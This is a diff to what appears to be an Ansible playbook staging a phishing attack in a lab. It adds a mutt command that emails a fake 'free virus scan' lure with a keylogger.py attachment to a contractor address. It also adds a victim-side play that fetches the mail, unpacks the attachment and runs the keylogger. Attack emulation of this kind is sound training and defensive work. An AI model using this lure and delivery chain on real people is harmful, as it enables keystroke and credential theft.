@@ -6,4 +6,14 @@
   hosts: blackhat
   tasks:
     - name: send a phishing email
-      raw: echo "Are you frustrated with how slow your computer is? Open the attachment for a free virus scan!" | mutt -s "Free virus scan!" contractor@fazio.com
+      raw: echo "Are you frustrated with how slow your computer is? Open the attachment for a free virus scan!" | mutt -s "Free virus scan!" -a keylogger.py -- contractor@fazio.com
+
+- name: phishing response
+  hosts: contractor
+  tasks:
+    - name: download the email
+      raw: fetchmail
+    - name: unpack the attachment
+      raw: munpack /var/mail/ubuntu
+    - name: run the keylogger
+      raw: python keylogger.py
